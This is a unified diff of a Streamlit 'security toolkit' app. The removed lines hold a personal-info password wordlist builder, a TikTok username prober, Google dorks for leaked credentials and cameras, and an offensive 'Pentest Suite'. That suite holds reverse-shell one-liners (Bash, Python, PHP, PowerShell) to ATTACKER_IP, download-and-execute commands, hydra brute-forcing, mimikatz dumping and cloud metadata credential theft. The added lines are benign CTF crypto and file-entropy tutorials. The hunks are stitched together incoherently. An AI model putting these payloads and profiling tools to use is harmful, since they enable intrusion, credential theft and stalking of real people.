-            st.markdown(f"<div class='result-card'><code>Base64</code><br><small style='color:#00e5ff;'>{base64.b64encode(enc).decode()}</small></div>", unsafe_allow_html=True)
-
-    elif pw_mode == "Wordlist Builder":
-        st.markdown("Generate a targeted wordlist from personal info (for authorized pen-testing only).")
-        name    = st.text_input("Name", placeholder="john smith")
-        dob     = st.text_input("Date of birth", placeholder="19900115")
-        keyword = st.text_input("Keywords (comma-separated)", placeholder="dog,company,city")
-        if st.button("Generate Wordlist", use_container_width=True) and (name or keyword):
-            words = set()
-            parts = name.lower().split() if name else []
-            for p in parts:
-                words.update([p, p.capitalize(), p+"123", p+"1", p+"!", p+"2024", p+"2025"])
-            if len(parts) >= 2:
-                words.update([parts[0]+parts[1], parts[0]+"."+parts[1], parts[0][0]+parts[1]])
-            if dob:
-                for p in parts:
-                    words.update([p+dob, p+dob[-4:], p+dob[-2:]])
-            for kw in (keyword.split(",") if keyword else []):
-                kw = kw.strip().lower()
-                words.update([kw, kw.capitalize(), kw+"123", kw+"!", kw+"2024", kw+"2025", kw+"1"])
-            words.discard("")
-            wl = "\n".join(sorted(words))
-            st.success(f"✅ {len(words)} candidates generated")
-            st.code(wl[:2000])
-            st.download_button("📥 Download wordlist.txt", wl, file_name="wordlist.txt", mime="text/plain")
-
-# ========== TAB 9: TikTok Direct Finder ==========
-with tab9:
-    st.markdown("### 🎵 TikTok Finder")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Direct TikTok profile search + similar name guessing.</p>", unsafe_allow_html=True)
-    tt_query = st.text_input("TikTok username or real name", placeholder="@charlidamelio or Charlie D'Amelio", key="tt_q")
-    if tt_query:
-        raw = tt_query.strip().lstrip("@").lower()
-        parts = raw.split()
-        candidates = {raw, raw.replace(" ",""), raw.replace(" ","_"), raw.replace(" ",".")}
-        if len(parts) >= 2:
-            f, l = parts[0], parts[-1]
-            candidates.update([f+l, f+"."+l, f+"_"+l, f[0]+l, l+f, f+l+"_official",
-                                f+l+"official", "real"+f+l, f+l+"real", f+l+"tiktok",
-                                f+l+"tt", f+"_"+l+"_", "its"+f+l, f+l+"xo"])
-        candidates = [c for c in candidates if c]
-        st.markdown(f"**Trying {len(candidates)} username variants:**")
-        prog = st.progress(0)
-        found = []
-        for i, u in enumerate(sorted(candidates)):
-            prog.progress((i+1)/len(candidates))
-            url = f"https://tiktok.com/@{u}"
+If you have a hex string from a CTF and suspect XOR, paste it here. If you know the key, enter it.
+If you don't know the key, try single-byte brute force — we'll try all 256 possible keys and show you the readable ones.
+        """)
+        xor_hex = st.text_input("Hex-encoded ciphertext:", placeholder="1a2b3c4d5e...", key="xor_hex")
+        xor_key = st.text_input("XOR key (text or hex, leave blank to brute force):", key="xor_key")
+        if st.button("Decode", use_container_width=True) and xor_hex:
             try:
-                r = requests.get(url, timeout=5, headers={"User-Agent":"Mozilla/5.0"}, allow_redirects=True)
-                body = r.text.lower()
-                if r.status_code == 200 and not any(x in body for x in ["couldn't find","page not found","user not found","sorry, this"]):
-                    found.append((u, url))
-            except: pass
-        prog.empty()
-        if found:
-            st.success(f"✅ {len(found)} TikTok profile(s) found")
-            for u, url in found:
-                st.markdown(f"<div class='result-card'>🎵 <b>@{u}</b><br><a href='{url}' target='_blank'>{url}</a></div>", unsafe_allow_html=True)
-        else:
-            st.warning("No profiles confirmed live. Try opening links manually:")
-            for u in sorted(candidates)[:8]:
-                st.markdown(f"<div class='result-card'>→ <a href='https://tiktok.com/@{u}' target='_blank'>tiktok.com/@{u}</a></div>", unsafe_allow_html=True)
-        # Always show direct search links
-        st.markdown("#### 🔗 Direct Search Links")
-        c1, c2, c3 = st.columns(3)
-        c1.link_button("TikTok Search", f"https://tiktok.com/search/user?q={urllib.parse.quote(tt_query)}", use_container_width=True)
-        c2.link_button("Google: site:tiktok.com", f"https://google.com/search?q=site:tiktok.com+{urllib.parse.quote(tt_query)}", use_container_width=True)
-        c3.link_button("Tikhub Profile", f"https://tikhub.io/search?keyword={urllib.parse.quote(tt_query)}", use_container_width=True)
-
-# ========== TAB 10: Pentest Suite ==========
-with tab10:
-    st.markdown("### 🛡️ Pentest Suite")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Offensive security reference, payload library, and recon commands. For authorized use only.</p>", unsafe_allow_html=True)
-
-    pt_cat = st.selectbox("Category", [
-        "🔎 Reconnaissance","📡 Port & Service Scanning","💥 Exploitation Reference",
-        "🔑 Credential Attacks","🐚 Reverse Shells","📤 File Transfer","🏃 Post-Exploitation",
-        "🌐 Web App Testing","🔒 SSL/TLS Analysis","📶 Wireless","🐧 Linux PrivEsc","🪟 Windows PrivEsc",
-        "🐳 Docker / Container Escape","☁️ Cloud (AWS/GCP/Azure)","🔄 Pivoting & Tunneling"
-    ], key="pt_cat")
-
-    PT = {
-        "🔎 Reconnaissance": [
-            ("Passive DNS", "dnsx -d target.com -a -aaaa -cname -mx -ns -txt -resp"),
-            ("WHOIS", "whois target.com"),
-            ("Shodan CLI", "shodan host 1.2.3.4\nshodan search 'apache port:80 country:US'"),
-            ("Censys search", "→ censys.io/search  |  API: pip install censys"),
-            ("theHarvester", "theHarvester -d target.com -b google,bing,linkedin,twitter"),
-            ("Recon-ng", "recon-ng\n> marketplace install all\n> workspaces create target\n> db insert domains target.com"),
-            ("Maltego", "GUI — maltego.com (free community edition)"),
-            ("OSINT Framework", "→ osintframework.com"),
-        ],
-        "📡 Port & Service Scanning": [
-            ("Quick top 1000", "nmap -sV -sC -T4 target.com"),
-            ("Full port scan", "nmap -p- --min-rate 5000 -T4 target.com"),
-            ("UDP scan", "nmap -sU --top-ports 200 target.com"),
-            ("Version + scripts", "nmap -sV -sC -p 22,80,443,3306 target.com"),
-            ("Output all formats", "nmap -oA scan_results target.com"),
-            ("Masscan (fast)", "masscan -p1-65535 --rate=10000 target.com"),
-            ("Service banner grab", "nc -nv target.com 80\ntelnet target.com 25"),
-        ],
-        "💥 Exploitation Reference": [
-            ("Search Metasploit", "msfconsole\n> search type:exploit name:apache\n> use exploit/multi/handler"),
-            ("CVE lookup", "→ nvd.nist.gov  |  cve.mitre.org  |  exploit-db.com"),
-            ("SearchSploit", "searchsploit apache 2.4\nsearchsploit -m 12345"),
-            ("Nuclei templates", "nuclei -u https://target.com -t cves/ -t exposures/"),
-            ("SQLmap", "sqlmap -u 'https://target.com/page?id=1' --dbs --batch"),
-            ("WPScan", "wpscan --url https://target.com --enumerate u,p,t"),
-        ],
-        "🔑 Credential Attacks": [
-            ("Hydra SSH", "hydra -l admin -P rockyou.txt ssh://target.com"),
-            ("Hydra HTTP form", "hydra -l admin -P rockyou.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"),
-            ("Medusa FTP", "medusa -h target.com -u admin -P wordlist.txt -M ftp"),
-            ("CrackMapExec SMB", "crackmapexec smb target.com -u users.txt -p passwords.txt"),
-            ("Kerbrute (AD)", "kerbrute userenum -d domain.local users.txt"),
-            ("Default creds DB", "→ default-password.info  |  cirt.net/passwords"),
-        ],
-        "🐚 Reverse Shells": [
-            ("Bash", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"),
-            ("Python3", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"),
-            ("PHP", "php -r '$s=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
-            ("PowerShell", "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}"),
-            ("Netcat listener", "nc -lvnp 4444"),
-            ("Upgrade TTY", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  then  Ctrl+Z  stty raw -echo; fg"),
-            ("RevShells generator", "→ revshells.com"),
-        ],
-        "📤 File Transfer": [
-            ("Python HTTP server", "python3 -m http.server 8080"),
-            ("wget", "wget http://ATTACKER:8080/file.sh -O /tmp/file.sh"),
-            ("curl", "curl http://ATTACKER:8080/file.sh -o /tmp/file.sh"),
-            ("certutil (Windows)", "certutil -urlcache -split -f http://ATTACKER/nc.exe nc.exe"),
-            ("PowerShell download", "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"),
-            ("SCP", "scp file.txt user@target:/tmp/"),
-            ("SMB server (impacket)", "impacket-smbserver share . -smb2support"),
-        ],
-        "🏃 Post-Exploitation": [
-            ("Enumerate users", "cat /etc/passwd  |  id  |  whoami  |  w"),
-            ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null"),
-            ("Writable dirs", "find / -writable -type d 2>/dev/null"),
-            ("Cron jobs", "cat /etc/crontab  |  crontab -l  |  ls /etc/cron.*"),
-            ("LinPEAS", "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"),
-            ("WinPEAS", "iex(iwr https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.ps1 -UseBasicParsing)"),
-            ("Mimikatz (Windows)", ".\\mimikatz.exe\nsekurlsa::logonpasswords\nlsadump::sam"),
-            ("BloodHound (AD)", "SharpHound.exe --CollectionMethods All\n# Import to BloodHound GUI"),
-        ],
-        "🌐 Web App Testing": [
-            ("Directory brute-force", "gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt"),
-            ("ffuf fuzzing", "ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302"),
-            ("Nikto scan", "nikto -h https://target.com"),
-            ("Burp Suite", "Intercept proxy → Repeater → Intruder → Scanner (Pro)"),
-            ("CORS test", "curl -H 'Origin: https://evil.com' -I https://target.com/api"),
-            ("JWT decode", "→ jwt.io  |  python3 -c \"import base64,json; print(json.loads(base64.b64decode(token.split('.')[1]+'==')))\""),
-            ("SSRF probe", "Burp Collaborator or webhook.site as callback URL"),
-            ("GraphQL recon", "ffuf -u https://target.com/FUZZ -w graphql-wordlist.txt"),
-        ],
-        "🔒 SSL/TLS Analysis": [
-            ("testssl.sh", "testssl.sh https://target.com"),
-            ("sslscan", "sslscan target.com:443"),
-            ("nmap ssl scripts", "nmap --script ssl-enum-ciphers -p 443 target.com"),
-            ("Certificate transparency", "→ crt.sh/?q=%.target.com  (finds subdomains via SSL certs)"),
-            ("SSL Labs", "→ ssllabs.com/ssltest/analyze.html?d=target.com"),
-        ],
-        "📶 Wireless": [
-            ("Monitor mode", "airmon-ng start wlan0"),
-            ("Capture handshake", "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon"),
-            ("Deauth attack", "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon"),
-            ("Crack WPA2", "hashcat -m 2500 cap.hccapx rockyou.txt"),
-            ("WPS attack", "wash -i wlan0mon  →  reaver -i wlan0mon -b BSSID -vv"),
-        ],
-        "🐧 Linux PrivEsc": [
-            ("Sudo -l", "sudo -l  # look for NOPASSWD entries"),
-            ("GTFOBins", "→ gtfobins.github.io  # escape restricted shells via sudo"),
-            ("Kernel exploit", "uname -a  →  search on exploit-db.com"),
-            ("SUID shell", "find / -perm -u=s 2>/dev/null  →  run via GTFOBins"),
-            ("Path hijack", "echo $PATH  →  write malicious binary in writable path dir"),
-            ("Capabilities", "getcap -r / 2>/dev/null"),
-            ("NFS no_root_squash", "cat /etc/exports  →  mount and create SUID binary"),
-        ],
-        "🪟 Windows PrivEsc": [
-            ("Whoami privs", "whoami /priv  # look for SeImpersonatePrivilege"),
-            ("Potato attacks", "PrintSpoofer / JuicyPotato / GodPotato if SeImpersonate"),
-            ("Unquoted service path", "wmic service get name,pathname | findstr /i /v \"c:\\windows\""),
-            ("AlwaysInstallElevated", "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"),
-            ("WinPEAS full", "winpeas.exe > out.txt 2>&1"),
-            ("LOLBAS", "→ lolbas-project.github.io"),
-        ],
-        "🐳 Docker / Container Escape": [
-            ("Check if in container", "cat /proc/1/cgroup | grep docker  |  ls /.dockerenv"),
-            ("Docker socket escape", "find / -name docker.sock 2>/dev/null\ncurl -s --unix-socket /var/run/docker.sock http://localhost/containers/json"),
-            ("Privileged container", "fdisk -l  →  mount /dev/sda1 /mnt  →  chroot /mnt"),
-            ("Cap audit_write", "capsh --print | grep cap_sys_admin"),
-            ("Deepce tool", "curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh"),
-        ],
-        "☁️ Cloud (AWS/GCP/Azure)": [
-            ("AWS metadata SSRF", "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
-            ("AWS CLI enum", "aws sts get-caller-identity\naws s3 ls\naws iam list-users"),
-            ("Enumerate S3", "aws s3 ls s3://bucket-name --no-sign-request"),
-            ("GCP metadata", "curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'"),
-            ("Azure IMDS", "curl -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"),
-            ("Pacu (AWS exploitation)", "pip install pacu  →  pacu"),
-            ("ScoutSuite", "scout aws  # multi-cloud security auditing"),
-        ],
-        "🔄 Pivoting & Tunneling": [
-            ("SSH local forward", "ssh -L 8080:internal.host:80 user@jump.host"),
-            ("SSH dynamic (SOCKS)", "ssh -D 1080 user@jump.host  →  proxychains nmap ..."),
-            ("Chisel", "# Server: chisel server -p 8000 --reverse\n# Client: chisel client ATTACKER:8000 R:3306:127.0.0.1:3306"),
-            ("Ligolo-ng", "# Fastest modern pivot tool — github.com/nicocha30/ligolo-ng"),
-            ("Proxychains", "proxychains nmap -sT -p 80,443 10.10.10.5"),
-            ("Socat port forward", "socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80"),
-        ],
-    }
-    for label, cmd in PT.get(pt_cat, []):
-        st.markdown(f"""<div class='result-card'><b style='color:rgba(200,220,255,0.85);'>{label}</b><br>
-        <code style='font-size:0.78rem;word-break:break-all;white-space:pre-wrap;'>{cmd}</code></div>""", unsafe_allow_html=True)
-
-    st.markdown("**External resources →**")
-    ec = st.columns(4)
-    ec[0].link_button("GTFOBins", "https://gtfobins.github.io", use_container_width=True)
-    ec[1].link_button("LOLBAS", "https://lolbas-project.github.io", use_container_width=True)
-    ec[2].link_button("RevShells", "https://revshells.com", use_container_width=True)
-    ec[3].link_button("HackTricks", "https://book.hacktricks.xyz", use_container_width=True)
-
-# ========== TAB 11: Crypto CTF+ ==========
-with tab11:
-    st.markdown("### 🔐 Crypto CTF+")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Advanced crypto solvers — RSA, XOR, frequency analysis, substitution, and more.</p>", unsafe_allow_html=True)
-    cc = st.selectbox("Tool", ["🔑 RSA Helper","📊 Frequency Analysis","🔀 XOR Brute-Force",
-                                "🔢 Multi-Base Decoder","🔤 Substitution Cipher Hints",
-                                "📜 Classic Cipher Library","🌐 Online Crypto Resources"], key="cc_tool")
-
-    if cc == "🔑 RSA Helper":
-        st.markdown("Paste RSA values to compute missing components or decrypt.")
-        rc1, rc2 = st.columns(2)
-        n_in = rc1.text_input("n (modulus)", key="rsa_n")
-        e_in = rc2.text_input("e (public exp)", value="65537", key="rsa_e")
-        p_in = rc1.text_input("p (factor, optional)", key="rsa_p")
-        q_in = rc2.text_input("q (factor, optional)", key="rsa_q")
-        c_in = st.text_input("c (ciphertext integer, optional)", key="rsa_c")
-        if st.button("Compute", use_container_width=True) and n_in and e_in:
-            try:
-                n, e = int(n_in), int(e_in)
-                p = int(p_in) if p_in else None
-                q = int(q_in) if q_in else None
-                if p and not q: q = n // p
-                if q and not p: p = n // q
-                if p and q:
-                    phi = (p-1)*(q-1)
-                    d = pow(e, -1, phi)
-                    st.markdown(f"<div class='glass-card'><b>d (private exp):</b> <code>{d}</code><br><b>φ(n):</b> <code>{phi}</code></div>", unsafe_allow_html=True)
-                    if c_in:
-                        c = int(c_in)
-                        m = pow(c, d, n)
-                        try:
-                            plain = m.to_bytes((m.bit_length()+7)//8, 'big').decode('utf-8','replace')
-                        except:
-                            plain = str(m)
-                        st.success(f"Decrypted: `{plain}`")
+                raw = bytes.fromhex(re.sub(r'[^0-9a-fA-F]', '', xor_hex))
+                if xor_key:
+                    kb = xor_key.encode() if not re.fullmatch(r'[0-9a-fA-F]+', xor_key) else bytes.fromhex(xor_key)
+                    result = bytes([raw[i] ^ kb[i % len(kb)] for i in range(len(raw))])
+                    ok(f"Result: `{result.decode('utf-8','replace')}`")
                 else:
-                    st.info("Provide p and q to compute d and decrypt. Use factordb.com to factor n.")
-                    st.link_button("FactorDB →", f"http://factordb.com/index.php?query={n_in}", use_container_width=False)
-            except Exception as ex:
-                st.error(f"Error: {ex}")
+                    st.markdown("**Brute forcing single-byte XOR (showing printable results only):**")
+                    for k in range(256):
+                        candidate = bytes([b ^ k for b in raw])
+                        if sum(32 <= c <= 126 for c in candidate) > len(raw) * 0.8:
+                            ok(f"Key 0x{k:02x} ({k}): `{candidate.decode('ascii','replace')}`")
+            except Exception as e:
+                danger(f"Error: {e}. Make sure the input is valid hex.")
 
-    elif cc == "📊 Frequency Analysis":
-        ft = st.text_area("Ciphertext (substitution cipher)", height=120)
-        if ft:
-            freq = Counter(c.upper() for c in ft if c.isalpha())
-            total = sum(freq.values())
-            st.markdown("**Letter frequency (most → least):**")
-            for ch, cnt in freq.most_common():
-                pct = cnt/total*100
-                bar = int(pct*2)
-                st.markdown(f"<div class='result-card'><code>{ch}</code> {'█'*bar} {pct:.1f}%</div>", unsafe_allow_html=True)
-            st.markdown("**English reference:** E T A O I N S H R D L C U M W F G Y P B V K J X Q Z")
-            st.info("Map most-frequent cipher letters to E, T, A, O, I… to guess the substitution key.")
 
-    elif cc == "🔀 XOR Brute-Force":
-        xor_in = st.text_input("Hex-encoded ciphertext", placeholder="1a2b3c4d5e...")
-        if xor_in and xor_in.strip():
-            try:
-                ct = bytes.fromhex(xor_in.replace(" ",""))
-                st.markdown("**Single-byte XOR results (printable only):**")
-                for k in range(256):
-                    res = bytes([b^k for b in ct])
-                    if all(32 <= b <= 126 for b in res):
-                        st.markdown(f"<div class='result-card'><code>key=0x{k:02x}</code> {res.decode()[:200]}</div>", unsafe_allow_html=True)
-            except Exception as ex:
-                st.error(f"Invalid hex: {ex}")
+# ── TAB 6: DEEP FILE SCAN ───────────────────────────────────────────────
+with tab6:
+    sec("Deep File Scan")
+    st.markdown("""
+**Upload any file** and we'll pull it apart:
+- Calculate its SHA256 hash (good for verifying integrity)
+- Measure its entropy — high entropy (7-8) means it's likely encrypted or compressed
+- Extract all readable strings from the raw bytes
+- Show a visual entropy heatmap
 
-    elif cc == "🔢 Multi-Base Decoder":
-        mb_in = st.text_input("Value", placeholder="VGhpcyBpcyBhIHRlc3Q=")
-        for name, fn in [
-            ("Base16", lambda x: bytes.fromhex(x).decode()),
-            ("Base32", lambda x: base64.b32decode(x.upper() + '='*((8-len(x)%8)%8)).decode()),
-            ("Base58", None),
-            ("Base64", lambda x: base64.b64decode(x+'==').decode()),
-            ("Base85", lambda x: base64.b85decode(x).decode()),
-        ]:
-            if mb_in and fn:
+**What's entropy?** It measures randomness. Normal text files have low entropy (~3-5). Encrypted files or compressed archives have high entropy (~7.5-8).
+    """)
+    tip("Try uploading a .jpg, .pdf, .zip, or any binary file. Encrypted sections will show up bright red on the heatmap.")
+
+    deep_f = st.file_uploader("Choose a file", key="deep_f")
+    if deep_f:
+        fb = deep_f.getvalue()
+        fname = deep_f.name
+        md5h = hashlib.md5(fb).hexdigest()
+        sha256h = hashlib.sha256(fb).hexdigest()
+        glass(f"<b>{fname}</b><br>Size: {len(fb):,} bytes<br>MD5: <code>{md5h}</code><br>SHA256: <code>{sha256h}</code>")
+
+        if len(fb) > 0:
+            freq = Counter(fb)
+            probs = [freq[b] / len(fb) for b in freq]
+            entropy = -sum(p * math.log2(p) for p in probs if p > 0)
+            st.metric("Shannon Entropy", f"{entropy:.2f} / 8.0",
+                      help="7-8 = encrypted/compressed. 0-4 = plain text.")
+
+            # Entropy heatmap — fixed column count
+            n_blocks = min(64, len(fb))
+            bsz = max(1, len(fb) // n_blocks)
+            ents = []
+            for i in range(0, len(fb), bsz):
+                blk = fb[i:i+bsz]
+                if blk:
+                    fq = Counter(blk)
+                    pv = [fq[b] / len(blk) for b in fq]
+                    ents.append(-sum(p * math.log2(p) for p in pv if p > 0))
+            n = min(64, len(ents))
+            if n > 0:
+                st.markdown("**Entropy heatmap** (blue = low / normal, red = encrypted/compressed):")
+                cols = st.columns(n)
+                for idx in range(n):
+                    e = ents[idx]
+                    color = f"hsl({int(240 - e * 30)}, 80%, 50%)"
+                    cols[idx].markdown(
+                        f"<div style='background:{color};height:24px;border-radius:4px;' title='{e:.2f}'></div>",
+                        unsafe_allow_html=True)
+
+        strings_found = re.findall(rb"[\x20-\x7E]{4,}", fb)
+        if strings_found:
+            unique_strings = list(dict.fromkeys(s.decode("ascii", "ignore") for s in strings_found))
+            with st.expander(f"🔤 Readable strings found ({len(unique_strings)}) — click to expand"):
+                st.code("\n".join(unique_strings[:100]))
+            st.download_button("📥 Download all strings as .txt",
+                               "\n".join(unique_strings[:500]),
+                               file_name=f"{fname}_strings.txt")
+
+
+# ── TAB 7: NETWORK RECON ────────────────────────────────────────────────
+with tab7:
+    sec("Network Recon")
+    st.markdown("""
+**Enter an IP address or domain name** to get:
+- DNS records (what servers are behind this domain?)
+- Geolocation (what country/city is this IP in?)
+- Links to threat intelligence databases (VirusTotal, Shodan)
+
+**What's DNS?** Domain Name System — it translates domain names (like google.com) into IP addresses (142.250.80.46).
+Looking up DNS records tells you what mail servers a company uses, what IP addresses a domain points to, and more.
+    """)
+    tip("Try entering a domain like `google.com` or an IP like `8.8.8.8` to see what comes back.")
+
+    net_t = st.text_input("IP address or domain", placeholder="8.8.8.8  or  example.com", key="net_t")
+    if st.button("Run Recon", use_container_width=True, key="net_go") and net_t:
+        tgt = net_t.strip().lower()
+        is_ip = bool(re.match(r'^\d{1,3}(\.\d{1,3}){3}$', tgt))
+        glass(f"<b>Target:</b> {tgt}")
+
+        if HAS_DNS and not is_ip:
+            sec("DNS Records")
+            tip("A = IPv4 address, MX = mail server, TXT = verification/SPF records, NS = name servers")
+            found_dns = False
+            for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT']:
                 try:
-                    st.markdown(f"<div class='result-card'><code>{name}</code> {fn(mb_in.strip())}</div>", unsafe_allow_html=True)
+                    answers = dns.resolver.resolve(tgt, rtype, lifetime=4)
+                    for ans in answers:
+                        rcard(f"<code>{rtype}</code> &nbsp; {str(ans)[:150]}")
+                        found_dns = True
                 except: pass
-        if mb_in:
-            st.link_button("CyberChef (all bases)", f"https://gchq.github.io/CyberChef/#input={urllib.parse.quote(base64.b64encode(mb_in.encode()).decode())}", use_container_width=False)
+            if not found_dns:
+                st.info("No DNS records found. Check if the domain is correct.")
 
-    elif cc == "🔤 Substitution Cipher Hints":
-        st.markdown("Rules of thumb for solving mono-alphabetic substitution:")
-        hints = [
-            ("1-letter words", "Almost always  **A**  or  **I**"),
-            ("2-letter words", "Common: of, to, in, it, is, be, as, at, so, we, he, by, or, on, do, if, me, my, up, an, go, no, us, am"),
-            ("3-letter words", "Common: the, and, for, are, but, not, you, all, can, her, was, one, our, out, day, get, has"),
-            ("Most frequent letter", "Almost always  **E**"),
-            ("Double letters", "Common doubles: ll, ee, ss, oo, tt, ff, rr, nn, pp"),
-            ("Letter before apostrophe", "Usually  **t** (it's, don't) or  **s** (he's)"),
-            ("Word ending -ing", "Reveals  **i**, **n**, **g**"),
-            ("Word ending -tion", "Common suffix — reveals  **t**, **i**, **o**, **n**"),
-        ]
-        for h, v in hints:
-            st.markdown(f"<div class='result-card'><b>{h}</b><br>{v}</div>", unsafe_allow_html=True)
-
-    elif cc == "📜 Classic Cipher Library":
-        ciphers = {
-            "Vigenère": "Polyalphabetic. Key repeats. Crack with Kasiski / Index of Coincidence.",
-            "Playfair": "Digraph cipher using 5×5 key matrix. Look for repeated digraphs.",
-            "Rail Fence": "Write text in zigzag rows, read across. Try rail counts 2–10.",
-            "Columnar Transposition": "Write in rows, read by column order. Anagramming key columns.",
-            "Beaufort": "Similar to Vigenère but reversed — C = K - P (mod 26).",
-            "Bacon's Cipher": "Each letter encoded as 5-bit A/B sequence (AABBA = F etc.).",
-            "Polybius Square": "5×5 grid — each letter = row,col pair. Watch for pairs of digits.",
-            "Four-Square": "2 key squares + 2 standard. Harder Playfair variant.",
-            "ADFGVX": "WWI field cipher. Substitution + columnar transposition with 6-char alphabet.",
-            "One-Time Pad": "Theoretically unbreakable if key is truly random and never reused.",
-        }
-        for name, desc in ciphers.items():
-            st.markdown(f"<div class='result-card'><b>{name}</b><br><span style='color:rgba(160,200,240,0.7);font-size:0.82rem;'>{desc}</span></div>", unsafe_allow_html=True)
-
-    elif cc == "🌐 Online Crypto Resources":
-        links = [
-            ("CyberChef","https://gchq.github.io/CyberChef/","All-in-one encode/decode/crypto tool"),
-            ("dCode.fr","https://dcode.fr/en","Every classic cipher solver ever made"),
-            ("CryptII","https://cryptii.com","Visual cipher conversion pipeline"),
-            ("quipqiup","https://quipqiup.com","Fast substitution cipher solver"),
-            ("FactorDB","http://factordb.com","Factor large RSA moduli"),
-            ("RsaCtfTool","https://github.com/RsaCtfTool/RsaCtfTool","Automated RSA attack tool"),
-            ("CrackStation","https://crackstation.net","Hash cracking rainbow tables"),
-            ("Boxentriq","https://boxentriq.com/code-breaking","Cipher identifier + solver"),
-        ]
-        for name, url, desc in links:
-            st.markdown(f"<div class='result-card'><b><a href='{url}' target='_blank'>{name}</a></b><br><span style='color:rgba(160,200,240,0.6);font-size:0.82rem;'>{desc}</span></div>", unsafe_allow_html=True)
-
-# ========== TAB 12: Google Dorking ==========
-with tab12:
-    st.markdown("### 🕵️ Google Dorking")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Build advanced search operators to find exposed data, files, and services.</p>", unsafe_allow_html=True)
-    d_target = st.text_input("Target domain or keyword", placeholder="example.com", key="dork_target")
-    dork_cat = st.selectbox("Dork category", [
-        "🔓 Login / Admin pages","📁 Exposed files & directories","🗄️ Database & config leaks",
-        "📷 Cameras & IoT","👤 People search","🔑 Credentials & keys",
-        "🌐 Subdomains & infrastructure","📧 Email harvesting","Custom dork builder"
-    ], key="dork_cat")
-
-    DORKS = {
-        "🔓 Login / Admin pages": [
-            'site:{t} inurl:admin', 'site:{t} inurl:login', 'site:{t} inurl:wp-admin',
-            'site:{t} intitle:"admin panel"', 'site:{t} inurl:dashboard',
-            'site:{t} inurl:phpmyadmin', 'site:{t} inurl:cpanel',
-        ],
-        "📁 Exposed files & directories": [
-            'site:{t} intitle:"index of"', 'site:{t} intitle:"index of /" inurl:backup',
-            'site:{t} ext:log', 'site:{t} ext:bak OR ext:old OR ext:backup',
-            'site:{t} ext:sql', 'site:{t} ext:xlsx OR ext:csv', 'site:{t} intitle:"index of" "parent directory"',
-        ],
-        "🗄️ Database & config leaks": [
-            'site:{t} ext:env', 'site:{t} ext:config', 'site:{t} "DB_PASSWORD"',
-            'site:{t} ext:xml inurl:config', 'site:{t} inurl:wp-config.php.bak',
-            'site:{t} ext:json "api_key"', 'site:{t} "mysql_connect"',
-        ],
-        "📷 Cameras & IoT": [
-            'inurl:"/view/index.shtml"', 'intitle:"Live View / - AXIS"',
-            'inurl:top.htm inurl:currenttime', 'intitle:"IP CAMERA Viewer"',
-            'inurl:"/viewer/live/index.html"', 'site:{t} inurl:cgi-bin/viewer',
-        ],
-        "👤 People search": [
-            '"{t}" site:linkedin.com', '"{t}" site:facebook.com',
-            '"{t}" email OR contact', '"{t}" resume OR cv filetype:pdf',
-            '"{t}" site:twitter.com', '"{t}" phone OR address',
-        ],
-        "🔑 Credentials & keys": [
-            'site:{t} "password" ext:txt', 'site:{t} "api_key" OR "apikey"',
-            'site:{t} "BEGIN RSA PRIVATE KEY"', 'site:{t} "access_token"',
-            'site:{t} "secret_key"', '"github.com" "{t}" "password"',
-        ],
-        "🌐 Subdomains & infrastructure": [
-            'site:*.{t}', 'site:{t} -www', 'site:{t} inurl:dev OR staging OR test',
-            'site:{t} inurl:api', 'ip:{t}', 'link:{t}',
-        ],
-        "📧 Email harvesting": [
-            'site:{t} "@{t}"', 'site:{t} "email" OR "contact" ext:txt',
-            '"{t}" "@gmail.com" OR "@yahoo.com"', 'site:{t} inurl:contact',
-        ],
-    }
-
-    if dork_cat == "Custom dork builder":
-        op1 = st.selectbox("Operator 1", ["site:","inurl:","intitle:","filetype:","ext:","intext:","link:","cache:"])
-        val1 = st.text_input("Value 1", value=d_target)
-        op2 = st.selectbox("Operator 2 (optional)", ["","inurl:","intitle:","filetype:","ext:","intext:","-inurl:"])
-        val2 = st.text_input("Value 2")
-        custom = f'{op1}{val1} {op2}{val2}'.strip()
-        st.markdown(f"<div class='result-card'><code>{custom}</code></div>", unsafe_allow_html=True)
-        st.link_button("Search on Google →", f"https://google.com/search?q={urllib.parse.quote(custom)}", use_container_width=True)
-    else:
-        t = d_target or "example.com"
-        dorks = DORKS.get(dork_cat, [])
-        for dork in dorks:
-            query = dork.format(t=t)
-            url = f"https://google.com/search?q={urllib.parse.quote(query)}"
-            st.markdown(f"""<div class='result-card'>
-              <code>{query}</code><br>
